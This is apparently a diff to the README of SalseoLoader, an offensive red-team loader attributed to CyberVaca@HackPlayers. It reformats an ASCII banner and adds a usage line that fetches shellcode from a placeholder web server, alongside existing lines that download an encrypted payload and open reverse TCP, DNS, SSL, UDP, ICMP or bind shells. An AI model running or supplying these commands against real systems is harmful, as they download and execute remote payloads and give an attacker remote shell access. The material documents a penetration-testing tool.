@@ -103,13 +103,13 @@ SalseoLoader is in charge of loading the encrypted payload. Can be both compiled
  \    ||  |  ||     \    ||     ||     |
   \___||__|__||_____|\___||_____| \___/
 
-  _       ___    ____  ___      ___  ____
- | |     /   \  /    ||   \    /  _]|    \
- | |    |     ||  o  ||    \  /  [_ |  D  )
- | |___ |  O  ||     ||  D  ||    _]|    /
- |     ||     ||  _  ||     ||   [_ |    \
- |     ||     ||  |  ||     ||     ||  .  \
- |_____| \___/ |__|__||_____||_____||__|\_|
+ _       ___    ____  ___      ___  ____
+| |     /   \  /    ||   \    /  _]|    \
+| |    |     ||  o  ||    \  /  [_ |  D  )
+| |___ |  O  ||     ||  D  ||    _]|    /
+|     ||     ||  _  ||     ||   [_ |    \
+|     ||     ||  |  ||     ||     ||  .  \
+|_____| \___/ |__|__||_____||_____||__|\_|
 
                              By: CyberVaca@HackPlayers
 
@@ -121,10 +121,11 @@ SalseoLoader is in charge of loading the encrypted payload. Can be both compiled
     [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt ReverseDNS LHOST ServerDNS
     [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt BindTCP LHOST LPORT
     [-] SalseoLoader.exe password c:\temp\elfuckingmal.txt ReverseSSL LHOST LPORT
+    [-] SalseoLoader.exe password http://webserver.com/shellcode.txt shellcode
 
 [+] Shells availables:
 
-    [-] ReverseTCP  [-] ReverseDNS   [-] ReverseSSL
+    [-] ReverseTCP  [-] ReverseDNS   [-] ReverseSSL [-] Shellcodes
     [-] ReverseUDP  [-] ReverseICMP  [-] BindTCP
 ```
 
